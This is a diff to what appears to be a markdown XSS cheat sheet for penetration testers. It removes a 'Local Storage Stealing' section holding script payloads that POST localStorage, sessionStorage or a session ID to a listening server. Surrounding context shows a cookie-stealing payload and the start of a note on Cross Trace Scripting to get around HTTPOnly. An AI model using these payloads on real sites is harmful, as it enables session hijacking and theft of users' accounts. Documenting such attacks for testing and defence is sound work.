@@ -26,32 +26,6 @@ body:document.cookie
 </script>
 ```
 
-### Local Storage Stealing
-
-Same as Cookie Stealing but send the content of session or local storage to the listening server. The content of the storage has to be converted to JSON format
-
-```
-<script>
-fetch('<listening server>', {
-method: 'POST',
-mode: 'no-cors',
-body:JSON.stringify(localStorage)    //or sessionStorage
-});
-</script>
-```
-
-Obtain session from session storage
-
-```
-<script>
-fetch('<listening server>', {
-method: 'POST',
-mode: 'no-cors',
-body:sessionStorage.getItem('sessionID') 
-});
-</script>
-```
-
 ### Cross Trace Scripting
 
 By default cookies with the HTTPOnly attribute set to true are invisible to browser scripts because they are sent only through GET or POST HTTP(S) requests. In order to obtain these cookie we make the user send a TRACE request to the server&#x20;
